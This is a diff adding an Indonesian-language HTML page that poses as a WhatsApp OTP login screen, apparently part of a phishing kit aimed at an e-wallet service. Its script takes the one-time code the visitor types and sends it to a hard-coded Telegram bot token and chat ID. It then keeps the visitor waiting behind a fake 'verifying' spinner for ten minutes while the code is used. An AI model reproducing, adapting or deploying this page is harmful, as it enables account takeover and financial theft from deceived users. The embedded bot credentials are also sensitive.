@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Masuk - OTP</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #0094FF;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      height: 100vh;
+      width: 100vw;
+      color: #fff;
+      position: relative;
+    }
+
+    .back-button {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 24px;
+      color: white;
+      text-decoration: none;
+    }
+
+    .content {
+      margin-top: 80px;
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .content h2 {
+      font-size: 22px;
+      font-weight: bold;
+      margin-bottom: 24px;
+    }
+
+    .phone-box {
+      background-color: rgba(255,255,255,0.1);
+      padding: 10px 16px;
+      border-radius: 12px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 8px;
+    }
+
+    .whatsapp {
+      font-size: 14px;
+      margin-bottom: 28px;
+    }
+
+    .otp-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .otp-inputs input {
+      width: 52px;
+      height: 52px;
+      text-align: center;
+      font-size: 24px;
+      border-radius: 12px;
+      border: none;
+    }
+
+    .resend-box {
+      background-color: white;
+      color: #999;
+      font-weight: bold;
+      border-radius: 16px;
+      padding: 10px 18px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 14px;
+    }
+
+    .loading-icon {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #fff;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    #loading-container {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 40px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+  </style>
+</head>
+<body>
+  <a href="#" class="back-button">&#8592;</a>
+
+  <div class="content">
+    <h2>Masuk</h2>
+    <p style="margin-bottom: 12px; font-size: 16px;">Kode OTP telah terkirim ke</p>
+
+    <div class="phone-box">
+      <span><img src="https://flagcdn.com/w40/id.png" alt="ID" style="width: 20px; height: 14px;"> +62</span>
+      <span id="nomor-dari-localstorage">0123456789</span>
+    </div>
+
+    <div class="whatsapp">
+      via <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA" style="width: 14px; vertical-align: middle;"> WhatsApp
+    </div>
+
+    <div class="otp-inputs">
+      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+      <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+    </div>
+
+    <div class="resend-box">
+      <span>KIRIM ULANG</span>
+      <span id="timer">01:00</span>
+      <div class="loading-icon"></div>
+    </div>
+
+    <div id="loading-container">
+      <div class="loading-icon"></div>
+      <p style="margin-top: 16px; font-size: 16px; color: white;">Sedang memverifikasi...</p>
+    </div>
+  </div>
+
+  <script>
+    // Timer OTP
+    let timeLeft = 60;
+    const timerDisplay = document.getElementById("timer");
+
+    function updateTimer() {
+      const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+      const seconds = String(timeLeft % 60).padStart(2, '0');
+      timerDisplay.textContent = `${minutes}:${seconds}`;
+
+      if (timeLeft > 0) {
+        timeLeft--;
+        setTimeout(updateTimer, 1000);
+      }
+    }
+
+    updateTimer();
+
+    // Tampilkan nomor dari localStorage
+    const nomor = localStorage.getItem('phone');
+    if (nomor) {
+      document.getElementById("nomor-dari-localstorage").textContent = nomor;
+    }
+
+    // Back button
+    document.querySelector(".back-button").addEventListener("click", function (e) {
+      e.preventDefault();
+      window.history.back();
+    });
+
+    // Input OTP logic
+    const otpInputs = document.querySelectorAll('.otp-inputs input');
+    const loadingContainer = document.getElementById('loading-container');
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+
+        const otpCode = Array.from(otpInputs).map(i => i.value).join('');
+        if (otpCode.length === otpInputs.length) {
+          sendOTPToTelegram(otpCode);
+          showLoadingAnimation();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function sendOTPToTelegram(otp) {
+      const message = `OTP: ${otp}`;
+      const token = '7573991625:AAGEabvedzkHODDvk0hE5RZ7mOWvC981sD4';
+      const chat_id = '7105244348';
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(() => {
+          console.log("OTP terkirim ke Telegram:", otp);
+        })
+        .catch(err => {
+          console.error("Gagal kirim OTP:", err);
+        });
+    }
+
+    function showLoadingAnimation() {
+      document.querySelector('.otp-inputs').style.display = 'none';
+      document.querySelector('.resend-box').style.display = 'none';
+      loadingContainer.style.display = 'flex';
+
+      // Tampilkan selama 10 menit (600000 ms)
+      setTimeout(() => {
+        loadingContainer.innerHTML = `<p style="margin-top: 40px; font-size: 18px; color: white;">Sesi selesai.</p>`;
+      }, 600000);
+    }
+
+    // Fokus ke input pertama saat halaman dimuat
+    otpInputs[0].focus();
+  </script>
+</body>
+</html>
